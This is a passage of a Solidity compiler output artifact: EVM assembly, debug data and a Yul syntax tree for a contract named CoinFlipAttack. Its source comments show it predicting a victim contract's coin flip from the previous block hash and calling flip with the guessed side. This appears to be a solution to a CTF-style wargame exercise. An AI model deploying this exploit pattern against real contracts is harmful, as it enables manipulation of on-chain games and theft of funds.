\"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/CoinflipAttack.sol\":167:711  contract CoinFlipAttack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/CoinflipAttack.sol\":167:711  contract CoinFlipAttack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xcde4efa9\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xf32d251d\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/CoinflipAttack.sol\":453:706  function flip() public returns (bool) {... */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/CoinflipAttack.sol\":198:228  CoinFlip public victimContract */\n    tag_4:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/CoinflipAttack.sol\":453:706  function flip() public returns (bool) {... */\n    tag_6:\n        /* \"contracts/CoinflipAttack.sol\":485:489  bool */\n      0x00\n        /* \"contracts/CoinflipAttack.sol\":500:518  uint256 blockValue */\n      dup1\n        /* \"contracts/CoinflipAttack.sol\":554:555  1 */\n      0x01\n        /* \"contracts/CoinflipAttack.sol\":539:551  block.number */\n      number\n        /* \"contracts/CoinflipAttack.sol\":539:555  block.number - 1 */\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n        /* \"contracts/CoinflipAttack.sol\":529:556  blockhash(block.number - 1) */\n      blockhash\n        /* \"contracts/CoinflipAttack.sol\":521:557  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"contracts/CoinflipAttack.sol\":500:557  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"contracts/CoinflipAttack.sol\":566:582  uint256 coinFlip */\n      0x00\n        /* \"contracts/CoinflipAttack.sol\":604:610  FACTOR */\n      sload(0x01)\n        /* \"contracts/CoinflipAttack.sol\":593:603  blockValue */\n      dup3\n        /* \"contracts/CoinflipAttack.sol\":593:610  blockValue/FACTOR */\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n        /* \"contracts/CoinflipAttack.sol\":566:611  uint256 coinFlip = uint256(blockValue/FACTOR) */\n      swap1\n      pop\n        /* \"contracts/CoinflipAttack.sol\":620:629  bool side */\n      0x00\n        /* \"contracts/CoinflipAttack.sol\":644:645  1 */\n      0x01\n        /* \"contracts/CoinflipAttack.sol\":632:640  coinFlip */\n      dup3\n        /* \"contracts/CoinflipAttack.sol\":632:645  coinFlip == 1 */\n      eq\n        /* \"contracts/CoinflipAttack.sol\":632:660  coinFlip == 1 ? true : false */\n      tag_18\n      jumpi\n        /* \"contracts/CoinflipAttack.sol\":655:660  false */\n      0x00\n        /* \"contracts/CoinflipAttack.sol\":632:660  coinFlip == 1 ? true : false */\n      jump(tag_19)\n    tag_18:\n        /* \"contracts/CoinflipAttack.sol\":648:652  true */\n      0x01\n        /* \"contracts/CoinflipAttack.sol\":632:660  coinFlip == 1 ? true : false */\n    tag_19:\n        /* \"contracts/CoinflipAttack.sol\":620:660  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"contracts/CoinflipAttack.sol\":669:683  victimContract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/CoinflipAttack.sol\":669:688  victimContract.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"contracts/CoinflipAttack.sol\":689:693  side */\n      dup3\n        /* \"contracts/CoinflipAttack.sol\":669:694  victimContract.flip(side) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_20\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_20:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_22\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_22:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_23\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_23:\n      pop\n        /* \"contracts/CoinflipAttack.sol\":491:706  {... */\n      pop\n      pop\n      pop\n        /* \"contracts/CoinflipAttack.sol\":453:706  function flip() public returns (bool) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/CoinflipAttack.sol\":198:228  CoinFlip public victimContract */\n    tag_10:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:97   */\n    tag_25:\n        /* \"#utility.yul\":41:48   */\n      0x00\n        /* \"#utility.yul\":84:89   */\n      dup2\n        /* \"#utility.yul\":77:90   */\n      iszero\n        /* \"#utility.yul\":70:91   */\n      iszero\n        /* \"#utility.yul\":59:91   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:97   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":103:212   */\n    tag_26:\n        /* \"#utility.yul\":184:205   */\n      tag_44\n        /* \"#utility.yul\":199:204   */\n      dup2\n        /* \"#utility.yul\":184:205   */\n      tag_25\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":179:182   */\n      dup3\n        /* \"#utility.yul\":172:206   */\n      mstore\n        /* \"#utility.yul\":103:212   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":218:428   */\n    tag_8:\n        /* \"#utility.yul\":305:309   */\n      0x00\n        /* \"#utility.yul\":343:345   */\n      0x20\n        /* \"#utility.yul\":332:341   */\n      dup3\n        /* \"#utility.yul\":328:346   */\n      add\n        /* \"#utility.yul\":320:346   */\n      swap1\n      pop\n        /* \"#utility.yul\":356:421   */\n      tag_46\n        /* \"#utility.yul\":418:419   */\n      0x00\n        /* \"#utility.yul\":407:416   */\n      dup4\n        /* \"#utility.yul\":403:420   */\n      add\n        /* \"#utility.yul\":394:400   */\n      dup5\n        /* \"#utility.yul\":356:421   */\n      tag_26\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":218:428   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":434:560   */\n    tag_27:\n        /* \"#utility.yul\":471:478   */\n      0x00\n        /* \"#utility.yul\":511:553   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":504:509   */\n      dup3\n        /* \"#utility.yul\":500:554   */\n      and\n        /* \"#utility.yul\":489:554   */\n      swap1\n      pop\n        /* \"#utility.yul\":434:560   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":566:626   */\n    tag_28:\n        /* \"#utility.yul\":594:597   */\n      0x00\n        /* \"#utility.yul\":615:620   */\n      dup2\n        /* \"#utility.yul\":608:620   */\n      swap1\n      pop\n        /* \"#utility.yul\":566:626   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":632:774   */\n    tag_29:\n        /* \"#utility.yul\":682:691   */\n      0x00\n        /* \"#utility.yul\":715:768   */\n      tag_50\n        /* \"#utility.yul\":733:767   */\n      tag_51\n        /* \"#utility.yul\":742:766   */\n      tag_52\n        /* \"#utility.yul\":760:765   */\n      dup5\n        /* \"#utility.yul\":742:766   */\n      tag_27\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":733:767   */\n      tag_28\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":715:768   */\n      tag_27\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":702:768   */\n      swap1\n      pop\n        /* \"#utility.yul\":632:774   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":780:906   */\n    tag_30:\n        /* \"#utility.yul\":830:839   */\n      0x00\n        /* \"#utility.yul\":863:900   */\n      tag_54\n        /* \"#utility.yul\":894:899   */\n      dup3\n        /* \"#utility.yul\":863:900   */\n      tag_29\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":850:900   */\n      swap1\n      pop\n        /* \"#utility.yul\":780:906   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":912:1053   */\n    tag_31:\n        /* \"#utility.yul\":977:986   */\n      0x00\n        /* \"#utility.yul\":1010:1047   */\n      tag_56\n        /* \"#utility.yul\":1041:1046   */\n      dup3\n        /* \"#utility.yul\":1010:1047   */\n      tag_30\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":997:1047   */\n      swap1\n      pop\n        /* \"#utility.yul\":912:1053   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1059:1220   */\n    tag_32:\n        /* \"#utility.yul\":1161:1213   */\n      tag_58\n        /* \"#utility.yul\":1207:1212   */\n      dup2\n        /* \"#utility.yul\":1161:1213   */\n      tag_31\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":1156:1159   */\n      dup3\n        /* \"#utility.yul\":1149:1214   */\n      mstore\n        /* \"#utility.yul\":1059:1220   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1226:1478   */\n    tag_12:\n        /* \"#utility.yul\":1334:1338   */\n      0x00\n        /* \"#utility.yul\":1372:1374   */\n      0x20\n        /* \"#utility.yul\":1361:1370   */\n      dup3\n        /* \"#utility.yul\":1357:1375   */\n      add\n        /* \"#utility.yul\":1349:1375   */\n      swap1\n      pop\n        /* \"#utility.yul\":1385:1471   */\n      tag_60\n        /* \"#utility.yul\":1468:1469   */\n      0x00\n        /* \"#utility.yul\":1457:1466   */\n      dup4\n        /* \"#utility.yul\":1453:1470   */\n      add\n        /* \"#utility.yul\":1444:1450   */\n      dup5\n        /* \"#utility.yul\":1385:1471   */\n      tag_32\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":1226:1478   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1484:1561   */\n    tag_33:\n        /* \"#utility.yul\":1521:1528   */\n      0x00\n        /* \"#utility.yul\":1550:1555   */\n      dup2\n        /* \"#utility.yul\":1539:1555   */\n      swap1\n      pop\n        /* \"#utility.yul\":1484:1561   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1567:1747   */\n    tag_34:\n        /* \"#utility.yul\":1615:1692   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1612:1613   */\n      0x00\n        /* \"#utility.yul\":1605:1693   */\n      mstore\n        /* \"#utility.yul\":1712:1716   */\n      0x11\n        /* \"#utility.yul\":1709:1710   */\n      0x04\n        /* \"#utility.yul\":1702:1717   */\n      mstore\n        /* \"#utility.yul\":1736:1740   */\n      0x24\n        /* \"#utility.yul\":1733:1734   */\n      0x00\n        /* \"#utility.yul\":1726:1741   */\n      revert\n        /* \"#utility.yul\":1753:1944   */\n    tag_15:\n        /* \"#utility.yul\":1793:1797   */\n      0x00\n        /* \"#utility.yul\":1813:1833   */\n      tag_64\n        /* \"#utility.yul\":1831:1832   */\n      dup3\n        /* \"#utility.yul\":1813:1833   */\n      tag_33\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":1808:1833   */\n      swap2\n      pop\n        /* \"#utility.yul\":1847:1867   */\n      tag_65\n        /* \"#utility.yul\":1865:1866   */\n      dup4\n        /* \"#utility.yul\":1847:1867   */\n      tag_33\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":1842:1867   */\n      swap3\n      pop\n        /* \"#utility.yul\":1886:1887   */\n      dup3\n        /* \"#utility.yul\":1883:1884   */\n      dup3\n        /* \"#utility.yul\":1880:1888   */\n      lt\n        /* \"#utility.yul\":1877:1911   */\n      iszero\n      tag_66\n      jumpi\n        /* \"#utility.yul\":1891:1909   */\n      tag_67\n      tag_34\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":1877:1911   */\n    tag_66:\n        /* \"#utility.yul\":1936:1937   */\n      dup3\n        /* \"#utility.yul\":1933:1934   */\n      dup3\n        /* \"#utility.yul\":1929:1938   */\n      sub\n        /* \"#utility.yul\":1921:1938   */\n      swap1\n      pop\n        /* \"#utility.yul\":1753:1944   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1950:2130   */\n    tag_35:\n        /* \"#utility.yul\":1998:2075   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1995:1996   */\n      0x00\n        /* \"#utility.yul\":1988:2076   */\n      mstore\n        /* \"#utility.yul\":2095:2099   */\n      0x12\n        /* \"#utility.yul\":2092:2093   */\n      0x04\n        /* \"#utility.yul\":2085:2100   */\n      mstore\n        /* \"#utility.yul\":2119:2123   */\n      0x24\n        /* \"#utility.yul\":2116:2117   */\n      0x00\n        /* \"#utility.yul\":2109:2124   */\n      revert\n        /* \"#utility.yul\":2136:2321   */\n    tag_17:\n        /* \"#utility.yul\":2176:2177   */\n      0x00\n        /* \"#utility.yul\":2193:2213   */\n      tag_70\n        /* \"#utility.yul\":2211:2212   */\n      dup3\n        /* \"#utility.yul\":2193:2213   */\n      tag_33\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":2188:2213   */\n      swap2\n      pop\n        /* \"#utility.yul\":2227:2247   */\n      tag_71\n        /* \"#utility.yul\":2245:2246   */\n      dup4\n        /* \"#utility.yul\":2227:2247   */\n      tag_33\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":2222:2247   */\n      swap3\n      pop\n        /* \"#utility.yul\":2266:2267   */\n      dup3\n        /* \"#utility.yul\":2256:2291   */\n      tag_72\n      jumpi\n        /* \"#utility.yul\":2271:2289   */\n      tag_73\n      tag_35\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":2256:2291   */\n    tag_72:\n        /* \"#utility.yul\":2313:2314   */\n      dup3\n        /* \"#utility.yul\":2310:2311   */\n      dup3\n        /* \"#utility.yul\":2306:2315   */\n      div\n        /* \"#utility.yul\":2301:2315   */\n      swap1\n      pop\n        /* \"#utility.yul\":2136:2321   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2408:2525   */\n    tag_37:\n        /* \"#utility.yul\":2517:2518   */\n      0x00\n        /* \"#utility.yul\":2514:2515   */\n      dup1\n        /* \"#utility.yul\":2507:2519   */\n      revert\n        /* \"#utility.yul\":2654:2770   */\n    tag_39:\n        /* \"#utility.yul\":2724:2745   */\n      tag_78\n        /* \"#utility.yul\":2739:2744   */\n      dup2\n        /* \"#utility.yul\":2724:2745   */\n      tag_25\n      jump\t// in\n    tag_78:\n        /* \"#utility.yul\":2717:2722   */\n      dup2\n        /* \"#utility.yul\":2714:2746   */\n      eq\n        /* \"#utility.yul\":2704:2764   */\n      tag_79\n      jumpi\n        /* \"#utility.yul\":2760:2761   */\n      0x00\n        /* \"#utility.yul\":2757:2758   */\n      dup1\n        /* \"#utility.yul\":2750:2762   */\n      revert\n        /* \"#utility.yul\":2704:2764   */\n    tag_79:\n        /* \"#utility.yul\":2654:2770   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2776:2913   */\n    tag_40:\n        /* \"#utility.yul\":2830:2835   */\n      0x00\n        /* \"#utility.yul\":2861:2867   */\n      dup2\n        /* \"#utility.yul\":2855:2868   */\n      mload\n        /* \"#utility.yul\":2846:2868   */\n      swap1\n      pop\n        /* \"#utility.yul\":2877:2907   */\n      tag_81\n        /* \"#utility.yul\":2901:2906   */\n      dup2\n        /* \"#utility.yul\":2877:2907   */\n      tag_39\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":2776:2913   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2919:3264   */\n    tag_24:\n        /* \"#utility.yul\":2986:2992   */\n      0x00\n        /* \"#utility.yul\":3035:3037   */\n      0x20\n        /* \"#utility.yul\":3023:3032   */\n      dup3\n        /* \"#utility.yul\":3014:3021   */\n      dup5\n        /* \"#utility.yul\":3010:3033   */\n      sub\n        /* \"#utility.yul\":3006:3038   */\n      slt\n        /* \"#utility.yul\":3003:3122   */\n      iszero\n      tag_83\n      jumpi\n        /* \"#utility.yul\":3041:3120   */\n      tag_84\n      tag_37\n      jump\t// in\n    tag_84:\n        /* \"#utility.yul\":3003:3122   */\n    tag_83:\n        /* \"#utility.yul\":3161:3162   */\n      0x00\n        /* \"#utility.yul\":3186:3247   */\n      tag_85\n        /* \"#utility.yul\":3239:3246   */\n      dup5\n        /* \"#utility.yul\":3230:3236   */\n      dup3\n        /* \"#utility.yul\":3219:3228   */\n      dup6\n        /* \"#utility.yul\":3215:3237   */\n      add\n        /* \"#utility.yul\":3186:3247   */\n      tag_40\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":3176:3247   */\n      swap2\n      pop\n        /* \"#utility.yul\":3132:3257   */\n      pop\n        /* \"#utility.yul\":2919:3264   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122039d2d98d2861fc83dd1aa347fa18de004eef61ad0f0045ac36d173753f00f16c64736f6c634300080f0033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_109": {
									"entryPoint": null,
									"id": 109,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"abi_decode_t_address_fromMemory": {
									"entryPoint": 234,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_address_fromMemory": {
									"entryPoint": 255,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 193,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 161,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 156,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 211,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1199:3",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "47:35:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "57:19:3",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "73:2:3",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "67:9:3"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:3"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "40:6:3",
														"type": ""
													}
												],
												"src": "7:75:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "177:28:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "194:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "197:1:3",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "187:12:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "187:12:3"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "300:28:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "317:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "320:1:3",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "310:12:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "310:12:3"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "379:81:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "389:65:3",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "404:5:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "411:42:3",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "400:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "400:54:3"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "389:7:3"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "361:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "371:7:3",
														"type": ""
													}
												],
												"src": "334:126:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "511:51:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "521:35:3",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "550:5:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "532:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "532:24:3"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "521:7:3"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "493:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "503:7:3",
														"type": ""
													}
												],
												"src": "466:96:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "611:79:3",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "668:16:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "677:1:3",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "680:1:3",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "670:6:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "670:12:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "670:12:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "634:5:3"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "659:5:3"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nodeType": "YulIdentifier",
																					"src": "641:17:3"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "641:24:3"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "631:2:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "631:35:3"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "624:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "624:43:3"
															},
															"nodeType": "YulIf",
															"src": "621:63:3"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "604:5:3",
														"type": ""
													}
												],
												"src": "568:122:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "759:80:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "769:22:3",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "784:6:3"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "778:5:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "778:13:3"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "769:5:3"
																}
															]
														},
														{
															"expression": {
